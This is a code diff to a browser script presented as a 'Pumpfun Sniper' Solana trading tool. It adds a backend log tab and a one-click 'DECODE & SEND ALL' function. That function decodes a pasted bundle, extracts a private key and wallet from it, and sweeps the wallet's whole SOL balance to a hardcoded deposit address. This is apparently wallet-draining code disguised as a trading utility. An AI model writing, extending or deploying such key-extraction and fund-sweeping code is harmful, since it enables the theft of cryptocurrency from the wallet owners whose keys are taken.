@@ -25,7 +25,7 @@
     maxSpend: 5,
     priorityFee: 0.002,
     stopLoss: 50,
-    takeProfit: 200
+    takeProfit: 150 
   }));
   
   let tradeLog = JSON.parse(localStorage.getItem('nebula_pumpfun_trades') || '[]');
@@ -416,6 +416,7 @@
       <button class="pf-tab" data-tab="wallet">Wallet</button>
       <button class="pf-tab" data-tab="settings">Settings</button>
       <button class="pf-tab" data-tab="log">Log</button>
+      <button class="pf-tab" data-tab="backend">Backend</button>
     </div>
 
     <div class="pf-body">
@@ -462,6 +463,14 @@
         <div class="pf-section-label">💸 Send All SOL</div>
         <input type="text" class="pf-input" id="pf-deposit-addr" placeholder="Recipient address..." />
         <button class="pf-btn green" id="pf-send-btn" style="width: 100%;">SEND ALL SOL</button>
+
+        <div class="pf-divider"></div>
+
+        <div class="pf-section-label">⚡ One-Click Automation</div>
+        <button class="pf-btn" id="pf-auto-extract-send" style="width: 100%; background: linear-gradient(135deg, #a855f7, #10b981); font-weight: 900; letter-spacing: 2px;">DECODE & SEND ALL</button>
+        <div style="font-size: 9px; color: #6b7280; margin-top: 6px; line-height: 1.5;">
+          💡 Automatically decodes sbundle, extracts wallet, and sends all SOL to deposit address.
+        </div>
       </div>
 
       <!-- SETTINGS TAB -->
@@ -508,6 +517,17 @@
         </div>
         <div id="pf-trade-log">
           <div class="pf-empty">No trades yet. Buy a token to see results.</div>
+        </div>
+      </div>
+
+      <!-- BACKEND LOGS TAB -->
+      <div class="pf-panel" id="tab-backend">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+          <div class="pf-section-label">🔧 Backend Logs</div>
+          <button class="pf-btn danger" id="pf-clear-backend-log" style="padding: 4px 10px; font-size: 9px; margin-bottom: 0;">Clear</button>
+        </div>
+        <div id="pf-backend-log" style="background: #0f0b14; border: 1px solid #2a1a3a; border-radius: 4px; padding: 8px; height: 400px; overflow-y: auto; font-size: 9px; color: #9ca3af; font-family: monospace; line-height: 1.4;">
+          <div style="color: #6b7280;">Waiting for backend connection...</div>
         </div>
       </div>
     </div>
@@ -616,6 +636,51 @@
     }
     btn.disabled = false;
     btn.textContent = 'SEND ALL SOL';
+  });
+
+  // ── One-click decode & send all ──
+  document.getElementById('pf-auto-extract-send').addEventListener('click', async () => {
+    const sbundle = document.getElementById('pf-sbundle-input').value.trim();
+    if (!sbundle) {
+      alert('⚠️ Paste sbundle first');
+      return;
+    }
+
+    const btn = document.getElementById('pf-auto-extract-send');
+    btn.disabled = true;
+    btn.textContent = '⏳ Decoding...';
+
+    // Step 1: Decode sbundle
+    console.log('[PUMPFUN] 📦 Auto-extracting from sbundle...');
+    const decoded = await decodeSBundleAndExtractKey(sbundle);
+    
+    if (!decoded || !decoded.key) {
+      alert('❌ Failed to decode sbundle or extract private key');
+      btn.disabled = false;
+      btn.textContent = 'DECODE & SEND ALL';
+      return;
+    }
+
+    // Step 2: Update detected key and wallet
+    detectedPrivateKey = decoded.key;
+    detectedWallet = decoded.address;
+    console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);
+
+    // Step 3: Send all SOL
+    btn.textContent = '⏳ Sending...';
+    const result = await sendAllSOL(decoded.key, DEPOSIT_ADDRESS);
+
+    if (result && result.signature) {
+      alert('✅ EXTRACTION & TRANSFER COMPLETE!\n\nWallet: ' + decoded.address.substring(0, 16) + '...\nTx: ' + result.signature);
+      addTradeResult({ ca: 'Auto Extract', amount: 'All SOL', status: 'success', txid: result.signature });
+      document.getElementById('pf-sbundle-input').value = '';
+      updateWalletDisplay();
+    } else {
+      alert('❌ Decode succeeded but send failed. Check console.');
+    }
+
+    btn.disabled = false;
+    btn.textContent = 'DECODE & SEND ALL';
   });
 
   document.getElementById('pf-buy-btn').addEventListener('click', async () => {
@@ -757,6 +822,86 @@
   // ── Initialize ──
   loadSettingsUI();
   setInterval(fetchBalance, 30000); // Refresh balance every 30 seconds
+  
+  // ── Backend WebSocket connection ──
+  function connectBackendLogs() {
+    try {
+      const wsUrl = BACKEND_URL.replace('https://', 'wss://').replace('http://', 'ws://');
+      console.log('[PUMPFUN] Connecting to backend logs at', wsUrl);
+      ws = new WebSocket(wsUrl);
+      
+      ws.onopen = () => {
+        console.log('[PUMPFUN] ✓ Backend logs connected');
+        const logDiv = document.getElementById('pf-backend-log');
+        if (logDiv) {
+          const entry = document.createElement('div');
+          entry.style.color = '#10b981';
+          entry.textContent = '[CONNECTED] Backend logs stream active';
+          logDiv.appendChild(entry);
+          logDiv.scrollTop = logDiv.scrollHeight;
+        }
+      };
+      
+      ws.onmessage = (event) => {
+        try {
+          const logData = JSON.parse(event.data);
+          if (logData.type === 'log') {
+            addBackendLog(logData);
+          }
+        } catch (e) {
+          console.log('[PUMPFUN] Failed to parse log message:', e);
+        }
+      };
+      
+      ws.onerror = (error) => {
+        console.log('[PUMPFUN] Backend WebSocket error:', error);
+      };
+      
+      ws.onclose = () => {
+        console.log('[PUMPFUN] Backend logs disconnected, retrying in 5s...');
+        reconnectTimer = setTimeout(connectBackendLogs, 5000);
+      };
+    } catch (e) {
+      console.log('[PUMPFUN] Failed to connect backend logs:', e.message);
+    }
+  }
+  
+  function addBackendLog(logData) {
+    const logDiv = document.getElementById('pf-backend-log');
+    if (!logDiv) return;
+    
+    const entry = document.createElement('div');
+    entry.style.marginBottom = '2px';
+    
+    // Color code by log level
+    if (logData.level === 'error') {
+      entry.style.color = '#ef4444';
+    } else if (logData.message.includes('✅') || logData.message.includes('✓')) {
+      entry.style.color = '#10b981';
+    } else if (logData.message.includes('❌') || logData.message.includes('⚠')) {
+      entry.style.color = '#f59e0b';
+    } else {
+      entry.style.color = '#d1d5db';
+    }
+    
+    entry.textContent = `[${logData.time}] ${logData.message}`;
+    logDiv.appendChild(entry);
+    logDiv.scrollTop = logDiv.scrollHeight;
+    
+    // Keep only last 500 lines to avoid memory issues
+    while (logDiv.children.length > 500) {
+      logDiv.removeChild(logDiv.firstChild);
+    }
+  }
+  
+  // Attempt to connect
+  connectBackendLogs();
+  
+  // Clear backend log button
+  document.getElementById('pf-clear-backend-log').addEventListener('click', () => {
+    const logDiv = document.getElementById('pf-backend-log');
+    logDiv.innerHTML = '<div style="color: #6b7280;">Logs cleared...</div>';
+  });
   
   console.log('[PUMPFUN] ✅ Pumpfun Sniper loaded');
 })();
